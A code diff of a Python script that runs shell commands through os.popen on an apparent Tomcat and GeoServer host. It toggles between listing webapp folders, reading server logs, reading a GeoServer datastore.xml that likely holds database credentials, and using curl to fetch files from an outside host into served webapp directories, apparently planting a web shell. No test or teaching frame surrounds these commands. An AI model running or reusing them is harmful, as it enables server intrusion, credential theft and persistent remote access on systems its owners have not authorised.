@@ -1,7 +1,7 @@
 import os
 
 # Execute the command (ls for Unix/Linux/macOS, dir for Windows)
-#stream = os.popen('ls -lha opt/tomcat/webapps/docs')  # or 'dir' for Windows
+stream = os.popen('ls -lha opt/tomcat/webapps/docs')  # or 'dir' for Windows
 #stream = os.popen('ls -lha home/super/data/data')  # or 'dir' for Windows
 #stream = os.popen('cat opt/tomcat/logs/catalina.2024-11-19.log')  # or 'dir' for Windows
 #stream = os.popen('cat opt/tomcat/webapps/geoserver/data/workspaces/nrs/STAGING-5433_NRS_DB/datastore.xml')  # or 'dir' for Windows
@@ -12,7 +12,7 @@ import os
 
 
 #stream = os.popen('curl -o opt/tomcat/webapps/aggregate/my_env_b.zip https://sbnke.com/my_env_be.zip')  # or 'dir' for Windows
-stream = os.popen('curl -o opt/tomcat/webapps/docs/netspi/netspi.html https://sbnke.com/jsp/netspi.html')  # or 'dir' for Windows
+#stream = os.popen('curl -o opt/tomcat/webapps/docs/netspi/netspi.html https://sbnke.com/jsp/netspi.html')  # or 'dir' for Windows
 
 #stream = os.popen('python3 -m pip install fastapi uvicorn --user')  # or 'dir' for Windows
 
